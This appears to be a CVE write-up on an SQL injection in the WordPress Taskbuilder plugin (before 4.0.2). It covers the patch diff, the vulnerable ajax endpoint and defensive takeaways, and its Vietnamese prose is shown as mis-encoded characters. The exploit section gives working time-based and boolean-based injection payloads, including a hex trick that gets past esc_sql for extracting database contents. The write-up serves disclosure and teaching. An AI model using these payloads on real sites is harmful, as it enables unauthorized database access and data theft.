---
title: CVE-2025-39569
description: Security Vulnerability in WordPress Taskbuilder Plugin.
date: 2025-08-31 18:56:00 +0700
categories: [Vulnerabilities, CVE Analyst]
tags: [analyst, plugin, sqli]
---

## Introduction
L·ªó h·ªïng x·∫£y ra tr√™n plugin **Taskbuilder** c·ªßa WordPress tr∆∞·ªõc phi√™n b·∫£n **4.0.2**. ƒêi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng tr·ª±c ti·∫øp t∆∞∆°ng t√°c v·ªõi c∆° s·ªü d·ªØ li·ªáu c·ªßa b·∫°n, bao g·ªìm kh√¥ng gi·ªõi h·∫°n ·ªü vi·ªác ƒë√°nh c·∫Øp th√¥ng tin.
- **CVE ID**: [CVE-2025-39569](https://www.cve.org/CVERecord?id=CVE-2025-39569)
- **Product**: [WordPress Hostel Plugin](https://wordpress.org/plugins/taskbuilder/)
- **Vulnerability Type**: SQL Injection  
- **Affected Versions**: < 4.0.2
- **CVSS severity**: High (8.5) 
- **Required Privilege**: Subscriber

## Requirements
- [**Local WordPress and Debugging**](https://w41bu1.github.io/posts/wordpress-local-and-debugging/)
- **Taskbuilder Plugin**:  v4.0.1(vul) v√† v4.0.2(fix)
- **diff tool**: **meld** ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th·∫•y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version

## Analysis
·ª®ng d·ª•ng ƒë√£ **x·ª≠ l√Ω d·ªØ li·ªáu ƒë·∫ßu v√†o** tr∆∞·ªõc khi ƒë∆∞a v√†o c√¢u SQL. Tuy nhi√™n, trong qu√° tr√¨nh x√¢y d·ª±ng truy v·∫•n, gi√° tr·ªã n√†y ƒë∆∞·ª£c ch√®n tr·ª±c ti·∫øp m√† kh√¥ng ƒë∆∞·ª£c bao trong d·∫•u nh√°y ƒë∆°n `'...'`. ƒêi·ªÅu ƒë√≥ khi·∫øn k·∫ª t·∫•n c√¥ng c√≥ th·ªÉ ch√®n th√™m c√°c th√†nh ph·∫ßn c√∫ ph√°p SQL h·ª£p l·ªá (nh∆∞ `OR`, `AND`,`...`) v√†o truy v·∫•n, d·∫´n ƒë·∫øn l·ªó h·ªïng SQL Injection.

### Patch Diff
D√πng diff tool b·∫•t k√¨ ƒë·ªÉ so s√°nh s·ª± kh√°c bi·ªát gi·ªØa b·∫£n l·ªói v√† b·∫£n v√°.
C√≥ s·ª± kh√°c bi·ªát r√µ ·ªü file **includes/admin/projects/get_users.php**

Trong phi√™n b·∫£n **v4.0.1**, bi·∫øn `$proj_id` sau khi escape ƒë∆∞·ª£c ƒë∆∞a th·∫≥ng v√†o c√¢u truy v·∫•n m√† kh√¥ng c√≥ d·∫•u nh√°y ƒë∆°n bao quanh:

```php
$proj_id = esc_sql($proj_id);
$project = $wpdb->get_row( "SELECT * FROM {$wpdb->prefix}wppm_project where id = $proj_id" );
```
{: file="includes/admin/projects/get_users.php v4.0.1" }

·ªû b·∫£n **v4.0.2**, truy v·∫•n ƒë√£ ƒë∆∞·ª£c ƒëi·ªÅu ch·ªânh b·∫±ng c√°ch ƒë·∫∑t `$proj_id` trong d·∫•u nh√°y ƒë∆°n sau khi escape:

```php
$proj_id = esc_sql($proj_id);
$project = $wpdb->get_row( "SELECT * FROM {$wpdb->prefix}wppm_project where id = '$proj_id'" );
```
{: file="includes/admin/projects/get_users.php v4.0.2" }

B·∫£n v√° n√†y ƒë·∫£m b·∫£o r·∫±ng gi√° tr·ªã `$proj_id` sau khi escape ƒë∆∞·ª£c coi l√† **m·ªôt chu·ªói literal**, kh√¥ng th·ªÉ tho√°t ra kh·ªèi d·∫•u nh√°y ƒë∆°n ƒë·ªÉ ch√®n th√™m c√∫ ph√°p SQL, qua ƒë√≥ ngƒÉn ch·∫∑n t·∫•n c√¥ng SQL Injection.

![patch diff](assets/img/posts/2025-08-31-CVE-2025-39569/patch_diff.png)

### How it work?

**File architecture**:

C·∫•u tr√∫c chung c·ªßa file hi·ªán t·∫°i

```php
$proj_id  = esc_sql($proj_id);
$project  = $wpdb->get_row("SELECT * FROM {$wpdb->prefix}wppm_project WHERE id = $proj_id");

// B·∫Øt ƒë·∫ßu buffer ƒë·ªÉ t·∫°o n·ªôi dung ch√≠nh (body) c·ªßa modal
ob_start();
// ... render HTML danh s√°ch users
$body = ob_get_clean();

// B·∫Øt ƒë·∫ßu buffer ƒë·ªÉ t·∫°o ph·∫ßn footer c·ªßa modal
ob_start();
// ... render HTML c√°c n√∫t thao t√°c (Close, Save)
$footer = ob_get_clean();

// Tr·∫£ d·ªØ li·ªáu JSON ƒë·ªÉ frontend hi·ªÉn th·ªã modal
echo json_encode([
    'body'   => $body,
    'footer' => $footer,
]);
```
{: file="includes/admin/projects/get_users.php v4.0.1" }

- `$proj_id` / `$project`: L·∫•y d·ªØ li·ªáu project t·ª´ database.
- `ob_start()` / `ob_get_clean()`: Ghi HTML ra buffer thay v√¨ xu·∫•t tr·ª±c ti·∫øp, gi√∫p gom n·ªôi dung v√†o bi·∫øn.
- `$body` / `$footer`: Ch·ª©a n·ªôi dung HTML ƒë·ªông c·ªßa modal.
- `json_encode()`: Tr·∫£ JSON cho client, c√≥ kh·∫£ nƒÉng ƒë∆∞·ª£c s·ª≠ d·ª•ng trong Ajax ƒë·ªÉ hi·ªÉn th·ªã modal m√† kh√¥ng c·∫ßn refresh trang.

File n·∫±m trong th∆∞ m·ª•c `includes` cho th·∫•y r·∫±ng n√≥ s·∫Ω ƒë∆∞·ª£c g·ªçi ·ªü 1 ch·ª©c nƒÉng n√†o ƒë√≥ ·ªü n∆°i kh√°c. ƒê·ªÉ bi·∫øt ch·ª©c nƒÉng n√†o s·ª≠ d·ª•ng n√≥, ta t√¨m ki·∫øm v·ªõi t·ª´ kh√≥a `get_users.php` trong th∆∞ m·ª•c ch·ª©a plugin.

![search_get_users](assets/img/posts/2025-08-31-CVE-2025-39569/search_get_users.png)

üëâ N√≥ ƒë∆∞·ª£c include trong h√†m `wppm_get_users()` c·ªßa class `WPPM_Admin` trong file **class-wppm-admin.php**.
`wppm_get_users()` l√† **callback** c·ªßa **action hook trong WordPress**.

**WPPM_Admin construct**:

```php
final class WPPM_Admin {
    // constructor
    public function __construct() {

        // other action

        add_action( 'wp_ajax_wppm_get_users',array($this,'wppm_get_users'));

        // array($this,'wppm_get_users')) = $this::wppm_get_users()
        // other action
    }
}
```
{: file="includes/class-wppm-admin.php v4.0.1" }

- `add_action()` l√† m·ªôt **Plugin API** c·ªßa WordPress, cho ph√©p g·∫Øn m·ªôt **callback** v√†o m·ªôt **action hook**.
- `wp_ajax_wppm_get_users` l√† t√™n hook Ajax, v·ªõi quy t·∫Øc ƒë·∫∑t t√™n:
    - `wp_ajax_{action}` => X·ª≠ l√Ω Ajax khi user ƒë√£ ƒëƒÉng nh·∫≠p.
    - `wp_ajax_nopriv_{action}` => X·ª≠ l√Ω Ajax khi user ch∆∞a ƒëƒÉng nh·∫≠p.
- ·ªû ƒë√¢y, `action = wppm_get_users`. Nghƒ©a l√† n·∫øu trong Ajax request b·∫°n g·ª≠i `action=wppm_get_users` t·ªõi `admin-ajax.php`, th√¨ WordPress s·∫Ω **t√¨m callback t∆∞∆°ng ·ª©ng ƒë·ªÉ x·ª≠ l√Ω**, ·ªü ƒë√¢y l√† `wppm_get_users()`.

üëâ Ta ƒë√£ bi·∫øt ƒë∆∞·ª£c `action = wppm_get_users`, ki·ªÉm tra xem Ajax n√†o s·ª≠ d·ª•ng action n√†y b·∫±ng c√°ch t√¨m t·ª´ kh√≥a `wppm_get_users` tr√™n c√°c file **.js** trong th∆∞ m·ª•c ch·ª©a plugin.

![ajax search](assets/img/posts/2025-08-31-CVE-2025-39569/ajax_search.png)

Action `wppm_get_users` l√† ph·∫ßn data trong request POST c·ªßa h√†m `wppm_get_users()`

H√†m `wppm_get_users()` s·∫Ω ƒë∆∞·ª£c ƒë·∫∑t trong HTML attribute c·ªßa **ch·ª©c nƒÉng project**
- T·∫°o project m·ªõi
- Truy c·∫≠p v√†o project ƒë√≥
- Inspect code v√† t√¨m h√†m `wppm_get_users` s·∫Ω ƒë∆∞·ª£c ƒë·∫∑t ·ªü ƒë√¢u, h√†nh ƒë·ªông n√†o s·∫Ω g·ªçi n√≥

![ajax inspect](assets/img/posts/2025-08-31-CVE-2025-39569/ajax_inspect.png)

üëâ Khi click v√†o **icon b√™n c·∫°nh Users** ajax s·∫Ω ho·∫°t ƒë·ªông, g·ª≠i request ƒë·∫øn server, l·∫•y danh s√°ch c√°c user tham gia project v√† m√£ HTML hi·ªÉn th·ªã n√≥.

![model_display](assets/img/posts/2025-08-31-CVE-2025-39569/model_display.png)

## Exploit
### Detect SQLi

B·∫Øt request b·∫±ng BurpSuite, g·ª≠i request v·ªõi SQLi payload **time base**

```http
POST /wp-admin/admin-ajax.php HTTP/1.1
...
action=wppm_get_users&proj_id=(SELECT+SLEEP(1))
```

![sqli_success](assets/img/posts/2025-08-31-CVE-2025-39569/sqli_success.png)

Th·ªùi gian ph·∫£n h·ªìi b·ªã delay => SQL Injection th√†nh c√¥ng.

### Get First Letter of Database Name
ƒêi·ªÅu ki·ªán ti√™n quy·∫øt ƒë·ªÉ **dump ƒë∆∞·ª£c h·∫øt data** l√† ph·∫£i dump ƒë∆∞·ª£c 1 k√Ω t·ª± b·∫•t k·ª≥ c·ªßa t√™n database, n·∫øu l·∫•y ƒë∆∞·ª£c th√¨ to√†n b·ªô data ƒë·ªÅu dump ƒë∆∞·ª£c.

G·ª≠i request v·ªõi SQLi payload **boolean base** v√≥i `proj_id` ƒë√∫ng:

```http
POST /wp-admin/admin-ajax.php HTTP/1.1
...
action=wppm_get_users&proj_id=(SELECT+IF(SUBSTRING(DATABASE(),1,1)=0x77,4,999))
```

> Database name ƒë∆∞·ª£c t√¥i ƒë·∫∑t t√™n l√† **wordpress** n√™n k√≠ t·ª± ƒë·∫ßu ti√™n l√† `w` t∆∞∆°ng ·ª©ng v·ªõi m√£ HEX l√† `0x77`
{: .prompt-info }

S·ª≠ d·ª•ng `SUBSTRING(STRING,1,1)` ƒë·ªÉ l·∫•y k√≠ t·ª± ƒë·∫ßu ti√™n c·ªßa chu·ªói

·ªû ƒë√¢y, `$proj_id` b·∫±ng `4` v√¨ `SUBSTRING('wordpress',1,1)=0x77` l√† ƒë√∫ng n√™n `SELECT` l·∫•y gi√° tr·ªã ƒë√∫ng trong `IF(condition, value if true, value if false)`, `4` l√† gi√° tr·ªã c√≥ th·ª±c trong database, n√™n response tr·∫£ v·ªÅ ch·ª©a danh s√°ch ng∆∞·ªùi tham gia d·ª± √°n

![response none](assets/img/posts/2025-08-31-CVE-2025-39569/res.png)

S·ª≠ d·ª•ng **HEX technique** ƒë·ªÉ bypass h√†m `esc_sql()` [·ªü tr√™n](#patch-diff), d√πng ƒë·ªÉ so s√°nh khi kh√¥ng s·ª≠ d√πng ƒë∆∞·ª£c `'`

G·ª≠i request v·ªõi SQLi payload **boolean base** v√≥i `proj_id` sai:

```http
POST /wp-admin/admin-ajax.php HTTP/1.1
...
action=wppm_get_users&proj_id=(SELECT+IF(SUBSTRING(DATABASE(),1,1)=0x77,999,4))
```

V·ªõi `proj_id` kh√¥ng c√≥ th·ª±c trong database, response s·∫Ω tr·∫£ v·ªÅ k·∫øt qu·∫£ ch·ª©a `None`

![response none](assets/img/posts/2025-08-31-CVE-2025-39569/res_none.png)

üëâ Ta ƒë√£ l·∫•y ƒë∆∞·ª£c k√≠ t·ª± ƒë·∫ßu ti√™n c·ªßa database name b·∫±ng k·ªπ thu·∫≠t **boolean base**
- `proj_id` ƒë√πng: response kh√¥ng ch·ª©a None
- `proj_id` sai: response ch·ª©a None

> C√≥ th·ªÉ s·ª≠ d·ª•ng k·ªπ thu·∫≠t **time base** nh∆∞ng khi dump s·ªë l∆∞·ª£ng l·ªõn data, th·ªùi gian dump s·∫Ω r·∫•t l√¢u
{: .prompt-info }

### Automatic Extraction
D·ª±a tr√™n kƒ© thu·∫≠t **boolean base** ta vi·∫øt script ƒë·ªÉ t·ª± ƒë·ªông khai th√°c.

[Script Here](https://github.com/w41bu1/w41bu1.github.io/blob/main/assets/code/posts/2025-08-31-CVE-2025-39569/script.py)

## Conclusion
L·ªó h·ªïng **CVE-2025-39569** trong plugin **WordPress Taskbuilder** xu·∫•t ph√°t t·ª´ vi·ªác thi·∫øu d·∫•u nh√°y ƒë∆°n `'...'` bao quanh d·ªØ li·ªáu ƒë·∫ßu v√†o trong c√¢u l·ªánh SQL, khi·∫øn d·ªØ li·ªáu ng∆∞·ªùi d√πng c√≥ th·ªÉ ƒë∆∞·ª£c di·ªÖn gi·∫£i nh∆∞ m·ªôt ph·∫ßn c·ªßa c√¢u l·ªánh SQL h·ª£p l·ªá.

B·∫£n v√° ·ªü phi√™n b·∫£n **4.0.2** ƒë√£ kh·∫Øc ph·ª•c v·∫•n ƒë·ªÅ b·∫±ng c√°ch ƒë∆∞a `$proj_id` v√†o trong `'...'`, ƒë·∫£m b·∫£o n√≥ lu√¥n ƒë∆∞·ª£c x·ª≠ l√Ω nh∆∞ m·ªôt literal string trong SQL.

**Key takeaways**:

- ∆Øu ti√™n s·ª≠ d·ª•ng **prepared statements** (`$wpdb->prepare()` trong WordPress) thay v√¨ t·ª± ch√®n d·ªØ li·ªáu v√†o query.
- ƒê·ªëi v·ªõi c√°c plugin WordPress, c·∫ßn test k·ªπ l∆∞·ª°ng **c√°c Ajax endpoint** v√¨ ƒë√¢y l√† n∆°i d·ªÖ xu·∫•t hi·ªán SQLi v√† XSS nh·∫•t.
- Ng∆∞·ªùi qu·∫£n tr·ªã c·∫ßn th∆∞·ªùng xuy√™n c·∫≠p nh·∫≠t plugin/theme ƒë·ªÉ nh·∫≠n b·∫£n v√° k·ªãp th·ªùi.

## References

[SQL Injection cheat sheet - PortSwigger](https://portswigger.net/web-security/sql-injection/cheat-sheet)

[WordPress Taskbuilder project mnagement tool Plugin <= 4.0.1 is vulnerable to SQL Injection](https://patchstack.com/database/wordpress/plugin/taskbuilder/vulnerability/wordpress-taskbuilder-4-0-1-sql-injection-vulnerability?_s_id=cve)